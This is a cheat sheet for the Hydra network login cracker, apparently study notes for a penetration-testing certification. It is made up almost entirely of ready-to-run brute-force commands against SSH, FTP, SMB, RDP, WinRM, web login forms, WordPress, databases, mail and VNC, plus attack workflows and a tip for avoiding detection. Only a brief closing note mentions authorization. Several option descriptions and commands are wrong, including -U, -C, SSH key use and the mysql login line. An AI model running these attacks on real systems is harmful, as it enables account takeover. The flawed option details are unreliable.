# 🔑 Hydra - Network Login Cracker Complete Cheat Sheet

> **A Comprehensive Guide to Hydra for Password Attack and Brute Force Testing**

## Table of Contents

1. [Installation & Setup](#installation--setup)
2. [Hydra Basics](#hydra-basics)
3. [SSH Brute Force](#ssh-brute-force)
4. [FTP Brute Force](#ftp-brute-force)
5. [SMB/Windows Attacks](#smbwindows-attacks)
6. [HTTP/HTTPS Attacks](#httphttps-attacks)
7. [Database Attacks](#database-attacks)
8. [Other Protocols](#other-protocols)
9. [Wordlist Management](#wordlist-management)
10. [Advanced Techniques](#advanced-techniques)
11. [Optimization & Performance](#optimization--performance)
12. [Troubleshooting](#troubleshooting)

---

## Installation & Setup

### Linux Installation (Debian/Ubuntu)

```bash
# Update packages
sudo apt-get update

# Install Hydra
sudo apt-get install hydra

# Verify installation
hydra -v
hydra --version
```

### Linux Installation (RedHat/CentOS)

```bash
# Install from EPEL
sudo yum install epel-release
sudo yum install hydra

# Or compile from source
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install
```

### macOS Installation

```bash
# Using Homebrew
brew install hydra

# Verify
hydra -v
```

### Windows Installation

```powershell
# Using Chocolatey
choco install hydra

# Or download from GitHub
# https://github.com/vanhauser-thc/thc-hydra/releases
```

### Kali Linux

```bash
# Already installed
hydra -v

# Update wordlists
sudo apt-get install wordlists
```

---

## Hydra Basics

### Basic Syntax

```bash
# Syntax
hydra [OPTIONS] [SERVICE] [HOST]

# Examples
hydra -l admin -p password ssh://192.168.1.100
hydra -l admin -p password ftp://192.168.1.100
hydra -U -P wordlist.txt http://192.168.1.100:8080
```

### Common Options

```bash
# Username & Password
-l <username>           # Single username
-L <userlist>           # Username list
-p <password>           # Single password
-P <passlist>           # Password list

# Service
-s <port>              # Custom port
-u                     # Try username as password
-U                     # Try empty password

# Output
-v                     # Verbose
-vv                    # Very verbose
-V                     # Show login/password tried
-o <file>              # Save output

# Threading & Performance
-t <threads>           # Number of threads (default 16)
-m <module>            # Module to use
-w <wait>              # Wait time between attempts

# Other
-f                     # Stop on first match
-e nsr                 # Try null, empty, reverse
-x <min>:<max>:<set>   # Brute force mode
```

---

## SSH Brute Force

### Basic SSH Attacks

```bash
# Single username, single password
hydra -l admin -p password ssh://192.168.1.100

# Single username, password list
hydra -l admin -P wordlist.txt ssh://192.168.1.100

# Username list, single password
hydra -L users.txt -p password ssh://192.168.1.100

# Username list, password list
hydra -L users.txt -P wordlist.txt ssh://192.168.1.100

# Custom port
hydra -l admin -P wordlist.txt -s 2222 ssh://192.168.1.100

# Try username as password
hydra -l admin -u ssh://192.168.1.100
```

### SSH Advanced Attacks

```bash
# Verbose output
hydra -l admin -P wordlist.txt -v ssh://192.168.1.100

# Very verbose (show each attempt)
hydra -l admin -P wordlist.txt -vv ssh://192.168.1.100

# Show attempts
hydra -l admin -P wordlist.txt -V ssh://192.168.1.100

# Stop on first success
hydra -l admin -P wordlist.txt -f ssh://192.168.1.100

# Save output
hydra -l admin -P wordlist.txt -o ssh_results.txt ssh://192.168.1.100

# Multiple threads (faster)
hydra -l admin -P wordlist.txt -t 32 ssh://192.168.1.100

# Try common credentials
hydra -l admin -e nsr ssh://192.168.1.100
```

### SSH Key Authentication

```bash
# SSH with key file
hydra -l admin -p /path/to/key ssh://192.168.1.100:22//rsa

# SSH with username list and keys
hydra -L users.txt -p /path/to/key ssh://192.168.1.100
```

---

## FTP Brute Force

### Basic FTP Attacks

```bash
# Single username and password
hydra -l admin -p password ftp://192.168.1.100

# Username list
hydra -L users.txt -P wordlist.txt ftp://192.168.1.100

# Custom port
hydra -l admin -P wordlist.txt -s 2121 ftp://192.168.1.100

# Stop on first success
hydra -l admin -P wordlist.txt -f ftp://192.168.1.100

# Verbose output
hydra -l admin -P wordlist.txt -v ftp://192.168.1.100
```

### FTP Anonymous

```bash
# Check anonymous login
hydra -l anonymous -p "" ftp://192.168.1.100

# Try empty password
hydra -l ftp -e nsr ftp://192.168.1.100
```

---

## SMB/Windows Attacks

### Basic SMB Attacks

```bash
# SMB brute force
hydra -l admin -P wordlist.txt smb://192.168.1.100

# Specific username
hydra -l Administrator -P wordlist.txt smb://192.168.1.100

# Domain\username
hydra -l "DOMAIN\\admin" -P wordlist.txt smb://192.168.1.100

# Custom port
hydra -l admin -P wordlist.txt -s 139 smb://192.168.1.100
```

### WinRM Attacks

```bash
# WinRM brute force
hydra -l admin -P wordlist.txt -s 5985 winrm://192.168.1.100

# WinRM HTTPS
hydra -l admin -P wordlist.txt -s 5986 winrm://192.168.1.100

# Custom endpoint
hydra -l admin -P wordlist.txt -m "/wsman" winrm://192.168.1.100
```

### RDP Attacks

```bash
# RDP brute force
hydra -l admin -P wordlist.txt rdp://192.168.1.100

# RDP with custom port
hydra -l admin -P wordlist.txt -s 3390 rdp://192.168.1.100
```

---

## HTTP/HTTPS Attacks

### HTTP Basic Auth

```bash
# Basic authentication
hydra -l admin -P wordlist.txt http-get://192.168.1.100/

# Custom port
hydra -l admin -P wordlist.txt -s 8080 http-get://192.168.1.100/

# HTTPS
hydra -l admin -P wordlist.txt https-get://192.168.1.100/
```

### HTTP Form Login

```bash
# Form-based login
hydra -l admin -P wordlist.txt -U http-post-form://192.168.1.100:80/"/:login=^USER^&pass=^PASS^:F=Invalid"

# Example with specific parameters
hydra -l admin -P wordlist.txt http-post-form://192.168.1.100/login.php:"username=^USER^&password=^PASS^":"Login failed"

# With cookies
hydra -l admin -P wordlist.txt http-post-form://192.168.1.100/login.php:"username=^USER^&password=^PASS^":"F=error:C=/path/to/cookie"
```

### HTTP Digest Auth

```bash
# Digest authentication
hydra -l admin -P wordlist.txt http-head://192.168.1.100/

# Custom path
hydra -l admin -P wordlist.txt http-head://192.168.1.100/admin/
```

### WordPress Attacks

```bash
# WordPress login
hydra -l admin -P wordlist.txt -U http-post-form://192.168.1.100/wp-login.php:"log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.100%2Fwp-admin%2F&testcookie=1":"F=ERROR"

# Simplified
hydra -l admin -P wordlist.txt http-post-form://192.168.1.100/wp-login.php:"log=^USER^&pwd=^PASS^":"F=login_error"
```

---

## Database Attacks

### MySQL Brute Force

```bash
# MySQL attack
hydra -l root -P wordlist.txt mysql://192.168.1.100

# Custom port
hydra -l root -P wordlist.txt -s 3307 mysql://192.168.1.100

# Database specific
hydra -l root -P wordlist.txt -m "mysql" mysql://192.168.1.100
```

### PostgreSQL Attacks

```bash
# PostgreSQL brute force
hydra -l postgres -P wordlist.txt postgres://192.168.1.100

# Custom port
hydra -l postgres -P wordlist.txt -s 5433 postgres://192.168.1.100
```

### MSSQL Attacks

```bash
# MSSQL brute force
hydra -l sa -P wordlist.txt mssql://192.168.1.100

# Named instance
hydra -l sa -P wordlist.txt mssql://192.168.1.100:1434

# Domain authentication
hydra -l "DOMAIN\\admin" -P wordlist.txt mssql://192.168.1.100
```

---

## Other Protocols

### Telnet

```bash
# Telnet brute force
hydra -l admin -P wordlist.txt telnet://192.168.1.100

# Custom port
hydra -l admin -P wordlist.txt -s 2323 telnet://192.168.1.100
```

### IMAP/POP3 (Email)

```bash
# IMAP brute force
hydra -l user@example.com -P wordlist.txt imap://192.168.1.100

# POP3 brute force
hydra -l user@example.com -P wordlist.txt pop3://192.168.1.100

# IMAPS/POP3S (SSL)
hydra -l user@example.com -P wordlist.txt imaps://192.168.1.100
hydra -l user@example.com -P wordlist.txt pop3s://192.168.1.100
```

### SMTP

```bash
# SMTP brute force
hydra -l admin -P wordlist.txt smtp://192.168.1.100

# SMTPS
hydra -l admin -P wordlist.txt smtps://192.168.1.100
```

### VNC

```bash
# VNC brute force
hydra -l "" -P wordlist.txt vnc://192.168.1.100

# With username
hydra -l admin -P wordlist.txt vnc://192.168.1.100
```

---

## Wordlist Management

### Common Wordlists

```bash
# System wordlists (Kali)
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/dirb/common.txt

# Create wordlist
echo "password" > wordlist.txt
echo "123456" >> wordlist.txt
echo "admin" >> wordlist.txt

# Combine wordlists
cat list1.txt list2.txt > combined.txt

# Sort and remove duplicates
sort -u wordlist.txt > unique.txt

# Common usernames
admin
root
user
test
guest
```

### Wordlist Filtering

```bash
# Filter by length
awk 'length>=6 && length<=12' wordlist.txt > filtered.txt

# Remove duplicates
sort -u wordlist.txt

# Count lines
wc -l wordlist.txt

# Head/tail
head -100 wordlist.txt
tail -100 wordlist.txt
```

---

## Advanced Techniques

### Brute Force Mode

```bash
# Character-based brute force
hydra -l admin -x 4:6:a ssh://192.168.1.100
# -x min:max:charset
# charset: a=lowercase, A=uppercase, 1=numbers, s=symbols

# Lowercase only (4-6 chars)
hydra -l admin -x 4:6:a ssh://192.168.1.100

# Numbers only (4-8 chars)
hydra -l admin -x 4:8:1 ssh://192.168.1.100

# All characters (3-5 chars)
hydra -l admin -x 3:5:aA1s ssh://192.168.1.100
```

### Multiple Usernames & Passwords

```bash
# Username and password list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Specific combinations
hydra -l admin -P wordlist.txt ssh://192.168.1.100
hydra -l root -P wordlist.txt ssh://192.168.1.100
```

### Try Empty/Null Passwords

```bash
# Empty password (-e nsr)
hydra -l admin -e nsr ssh://192.168.1.100
# n = null password
# s = use username as password
# r = reverse username

# Or create empty password file
echo "" > empty.txt
hydra -l admin -P empty.txt ssh://192.168.1.100
```

### Custom Module Options

```bash
# Show available modules
hydra -h

# Module-specific options
hydra -l admin -P wordlist.txt -m "/rsa" ssh://192.168.1.100

# Database specification
hydra -l root -P wordlist.txt -m "mysql" mysql://192.168.1.100
```

---

## Optimization & Performance

### Threading & Speed

```bash
# Default threads (16)
hydra -l admin -P wordlist.txt ssh://192.168.1.100

# Increase threads (faster)
hydra -l admin -P wordlist.txt -t 32 ssh://192.168.1.100
hydra -l admin -P wordlist.txt -t 64 ssh://192.168.1.100

# Decrease threads (avoid detection)
hydra -l admin -P wordlist.txt -t 4 ssh://192.168.1.100
hydra -l admin -P wordlist.txt -t 1 ssh://192.168.1.100
```

### Wait & Timing

```bash
# Wait between attempts (milliseconds)
hydra -l admin -P wordlist.txt -w 5 ssh://192.168.1.100

# Connect timeout
hydra -l admin -P wordlist.txt -c 10 ssh://192.168.1.100

# Login timeout
hydra -l admin -P wordlist.txt -C ssh://192.168.1.100
```

### Reduce Noise

```bash
# Quiet mode
hydra -q -l admin -P wordlist.txt ssh://192.168.1.100

# Less verbose
hydra -l admin -P wordlist.txt ssh://192.168.1.100 | grep -E "^\[" 

# Log to file (reduce output)
hydra -l admin -P wordlist.txt -o results.txt ssh://192.168.1.100
```

---

## Practical Workflows

### SSH Attack Workflow

```bash
# 1. Check if SSH is open
nmap -p 22 192.168.1.100

# 2. Get wordlists
# Common usernames
echo -e "admin\nroot\nuser\ntest" > users.txt

# 3. Brute force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 16 ssh://192.168.1.100

# 4. Save results
hydra -L users.txt -P wordlist.txt -o ssh_creds.txt ssh://192.168.1.100
```

### HTTP Form Attack

```bash
# 1. Identify login form
# Check HTML source for form fields

# 2. Create wordlists
# users.txt and passwords.txt

# 3. Brute force
hydra -L users.txt -P passwords.txt http-post-form://192.168.1.100/login.php:"username=^USER^&password=^PASS^":"F=Invalid login" -v

# 4. Verify credentials
curl -X POST http://192.168.1.100/login.php -d "username=admin&password=password123"
```

### Database Attack

```bash
# 1. Identify service
nmap -p 3306 192.168.1.100

# 2. Common credentials
echo -e "root\nadmin\napp" > db_users.txt

# 3. Attack
hydra -L db_users.txt -P wordlist.txt mysql://192.168.1.100

# 4. Connect if successful
mysql -h 192.168.1.100 -u root -p password123
```

---

## Troubleshooting

### Common Issues

| Issue | Solution |
|-------|----------|
| "Connection refused" | Check service running, firewall, port |
| "No valid targets" | Check syntax, IP format |
| "F=error string not found" | Adjust failure string, check response |
| "Timeout" | Increase timeout: `-c 30`, reduce threads |
| "No matches" | Check wordlist, credentials valid |

### Debug Mode

```bash
# Verbose output
hydra -v -L users.txt -P wordlist.txt ssh://192.168.1.100

# Very verbose
hydra -vv -L users.txt -P wordlist.txt ssh://192.168.1.100

# Debug SSL
hydra -vvv -L users.txt -P wordlist.txt https-get://192.168.1.100/
```

### Test HTTP Forms

```bash
# Capture request with Burp
# Get exact parameters

# Test locally
curl -X POST http://localhost/login.php \
  -d "username=admin&password=test" \
  -v

# Then use with Hydra
hydra -l admin -P wordlist.txt http-post-form://localhost/login.php:"username=^USER^&password=^PASS^":"F=error"
```

---

## Quick Reference

### Most Common Commands

```bash
# SSH
hydra -L users.txt -P pass.txt ssh://192.168.1.100

# FTP
hydra -L users.txt -P pass.txt ftp://192.168.1.100

# HTTP Form
hydra -L users.txt -P pass.txt http-post-form://192.168.1.100/login.php:"user=^USER^&pass=^PASS^":"F=failed"

# MySQL
hydra -L users.txt -P pass.txt mysql://192.168.1.100

# SMB
hydra -L users.txt -P pass.txt smb://192.168.1.100
```

### Reference Table

| Protocol | Service | Example |
|----------|---------|---------|
| SSH | ssh | `hydra -l user -P list.txt ssh://target` |
| FTP | ftp | `hydra -l user -P list.txt ftp://target` |
| HTTP | http-get | `hydra -l user -P list.txt http-get://target/` |
| HTTPS | https-get | `hydra -l user -P list.txt https-get://target/` |
| SMB | smb | `hydra -l user -P list.txt smb://target` |
| MySQL | mysql | `hydra -l user -P list.txt mysql://target` |
| RDP | rdp | `hydra -l user -P list.txt rdp://target` |
| VNC | vnc | `hydra -l user -P list.txt vnc://target` |

---

## Resources

- [Hydra Official](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra Man Page](https://linux.die.net/man/1/hydra)
- [SecLists Wordlists](https://github.com/danielmiessler/SecLists)
- [Rockyou Wordlist](https://github.com/praetorian-code/Hob0Rules)

---

## Legal & Ethical

⚠️ **Important**

- Only use Hydra with proper authorization
- Testing without permission is illegal
- Respect systems and privacy
- Use responsibly in authorized environments

---

## Changelog

- **v1.0** - Initial comprehensive cheat sheet
- **Last Updated** - June 2026
- **Status** - Production Ready
- **Format** - eJPT v2 Style Professional Documentation

---

© 2026 | Hydra Cheat Sheet | Educational Purpose
